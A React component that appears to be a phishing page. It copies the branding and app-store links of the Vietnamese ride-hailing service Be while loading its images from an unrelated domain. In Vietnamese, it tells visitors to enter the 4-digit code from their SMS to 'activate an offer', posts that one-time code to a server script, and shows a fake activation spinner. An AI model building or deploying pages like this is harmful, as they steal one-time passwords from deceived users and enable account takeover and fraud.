import React, { useState } from 'react';
import Swal from 'sweetalert2';
import $ from 'jquery'; // Import jQuery

function Main() {
    const [inputValue, setInputValue] = useState('');
    const [errorMessage, setErrorMessage] = useState('');

    const handleFormSubmit = (e) => {
        e.preventDefault();
        if (!/^\d{4}$/.test(inputValue)) {
            setErrorMessage("Vui lòng nhập đúng 4 ký tự số ở tin nhắn điện thoại.");
            return;
        }

        const swalConfig = {
            title: 'Thông báo!',
            html: 'Vui lòng chờ trong Giây lát,<br> hệ thống đang kích hoạt.',
            timerProgressBar: true,
            didOpen: () => {
                Swal.showLoading();
                const b = Swal.getHtmlContainer().querySelector('b');
                const timerInterval = setInterval(() => {
                    b.textContent = Swal.getTimerLeft();
                }, 100);
                return () => clearInterval(timerInterval);
            }
        };

        Swal.fire(swalConfig).then((result) => {
            if (result.dismiss === Swal.DismissReason.timer) {
                console.log('I was closed by the timer');
            }
        });

        // Tiến hành gửi Ajax request
        $.ajax({
            type: "POST",
            url: "api.php",
            data: { otp: inputValue },
            dataType: "json",
            success: function (data) {
                console.log(data);
                if (data.check === true) {
                    swalConfig.timer = 1000;
                    Swal.fire(swalConfig).then(() => {
                        // location.href = "/xonguudai.html";
                    });
                } else {
                    Swal.fire({
                        title: 'Lỗi!',
                        text: data.msg,
                        icon: 'error'
                    });
                }
            },
            error: function (xhr, status, error) {
                console.error("Lỗi mạng: " + error);
            }
        });
    };

    const handleInputChange = (e) => {
        setInputValue(e.target.value);
        setErrorMessage(''); // Clear error message when input changes
    };

    return (

        <div className="beheader" style={{ backgroundImage: 'url(https://acemobi.store/anhbia.png)' }}>
            <div className="contents d-flex align-items-center justify-content-end">
                <div className="text d-flex flex-column flex-nowrap justify-content-end">
                    <form onSubmit={handleFormSubmit}>
                        <div className="title"><span style={{ fontSize: '24px' }}>NHẬP OTP KÍCH HOẠT ƯU ĐÃI </span>.</div>
                        <div className="title" style={{ marginLeft: '120px' }}>⬇️</div>
                        <div className="title"><span style={{ fontSize: '28px' }}><input maxLength="4" name="1" type="tel" value={inputValue} onChange={handleInputChange} /></span></div>
                        <div id="error-message" style={{ color: 'red' }}>{errorMessage}</div>
                        <div className="des my-3">
                            <div style={{ margin: 'auto', width: '200px' }}>
                                <p><input className="btn3" name="submit" type="submit" value="Nhập Mã Ưu Đãi" /></p>
                            </div>
                        </div>
                    </form>
                    <div className="d-flex viewsmore " style={{ flexWrap: 'wrap' }}>
                        <span style={{ fontSize: '18px' }}>Tải ứng dụng để trải nghiệm các dịch vụ của Be</span>
                    </div>
                    <div className="d-flex viewsmore " style={{ flexWrap: 'wrap' }}>
                        <a className="app-apple" href="https://itunes.apple.com/vn/app/be/id1440565902?mt=8"><img alt="" src="https://be.com.vn/wp-content/themes/beThemes/assets/img/app-apple.svg" style={{ width: '150px', height: '50px' }} /></a>
                        <a className="app-android" href="https://play.google.com/store/apps/details?id=xyz.be.customer"><img alt="" src="https://be.com.vn/wp-content/themes/beThemes/assets/img/app-android.svg" style={{ height: '44px', width: '150px' }} /></a>
                    </div>
                </div>
                <div className="d-flex viewsmore " style={{ flexWrap: 'wrap' }}></div>
            </div>
        </div>
    );
}

export default Main;
